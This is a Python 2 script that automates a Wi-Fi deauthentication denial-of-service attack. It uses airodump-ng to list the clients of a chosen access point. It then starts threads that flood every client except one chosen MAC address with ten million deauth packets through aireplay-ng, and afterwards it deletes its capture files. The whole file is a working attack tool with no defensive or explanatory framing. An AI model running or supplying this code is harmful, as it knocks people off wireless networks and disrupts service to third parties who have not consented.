import os,subprocess,sys,thread,time,csv,pprint,netaddr,psutil,signal

def deauth(j,access,interface,client):
	os.system("aireplay-ng -0 10000000 -a "+access+" -c "+client+" "+interface)
	print(client)

def th(i,interface,access):
	os.system("airodump-ng "+interface+" --write wifidoss --bssid "+access)

def channelprob(y,ch,interface):
	os.system("airodump-ng "+interface+" --channel "+str(ch))
	kill()
def monitormode(z,interface):
	os.system("airmon-ng start wlan0")

print("Enter the Access point : ")
access=str(raw_input())
print("Enter the Exception MAC : ")
exception_mac=str(raw_input())
print("Enter the Interface which is in Monitor mode: ")
interface=str(raw_input())
thread.start_new_thread(th,("1",interface,access))
t1=time.time()
while(1):
	pass	
	t2=time.time()
	diff=int(t2-t1)
	if(diff > 20):
		for p in psutil.process_iter():
			if p.name()== "airodump-ng":
				p.kill()
		break
with open("wifidoss-01.csv", 'rb' ) as f:
    mycsv = csv.reader(f)
    mycsv = list(mycsv)
flag=0
if(exception_mac == access):
	print("Enter valid MAC address")
else:
	for i in range(5,1000):
		try:
			if(mycsv[i][0] != exception_mac):
				thread.start_new_thread(channelprob,("11",mycsv[2][3],interface))
				thread.start_new_thread(deauth,("2",access,interface,mycsv[i][0]))
				#thread.start_new_thread(deauth,("2",access,interface,mycsv[i][0]))
				print("channel :	"+str(mycsv[2][3]))
		except:
			break
try:
	os.remove("wifidoss-01.csv")
	os.remove("wifidoss-01.kismet.csv")
	os.remove("wifidoss-01.kismet.netxml")
	os.remove("wifidoss-01.cap")
except:
	print("")
while(1):
	pass